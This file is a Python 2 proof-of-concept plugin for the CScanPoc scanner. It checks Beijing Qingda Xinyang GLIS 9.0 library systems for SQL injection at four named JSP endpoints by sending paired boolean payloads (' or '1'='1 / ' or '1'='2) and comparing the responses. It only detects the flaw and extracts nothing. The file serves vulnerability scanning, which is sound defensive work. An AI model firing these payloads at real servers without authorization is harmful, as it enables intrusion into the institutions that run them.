# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'Infosea_0005' # 平台漏洞编号，留空
    name = '北京清大新洋通用图书馆集成系统GLIS9.0 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-08-14'  # 漏洞公布时间
    desc = '''
        北京清大新洋通用图书馆集成系统GLIS9.0，存在多出注入漏洞： 
        ggjs/dzxx/dzxmjsajax.jsp?nameparm=-1
        ggjs/dzxx/dzxmjs.jsp?nameparm=-1
        ggjs/wsfb/getejdw.jsp?yjdw=-1
        ggjs/zdjk/getjstj.jsp?kid=-1
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '清大新洋'  # 漏洞应用名称
    product_version = '北京清大新洋通用图书馆集成系统GLIS9.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'cd62aebd-7a34-42b9-bf0f-81331a57aa23'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0132188
            hh = hackhttp.hackhttp() 
            arg = self.target       
            payloads = [
                '/ggjs/dzxx/dzxmjsajax.jsp?nameparm=-1',
                '/ggjs/dzxx/dzxmjs.jsp?nameparm=-1',
                '/ggjs/wsfb/getejdw.jsp?yjdw=-1',
                '/ggjs/zdjk/getjstj.jsp?kid=-1',
            ]
            getdata1 = '%27%20or%20%271%27%3D%271'
            getdata2 = '%27%20or%20%271%27%3D%272'
            for payload in payloads:
                url1 = arg + payload +getdata1
                url2 = arg + payload + getdata2
                code1, head, res1, errcode, _ = hh.http(url1)
                code2, head, res2, errcode, _ = hh.http(url2)  
                m1 = re.findall('0',res1)
                m2 = re.findall('0',res2)
                if code1 == 200 and code2 ==200 and  m1!=m2 :
                    #security_hole(arg+payload+'   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
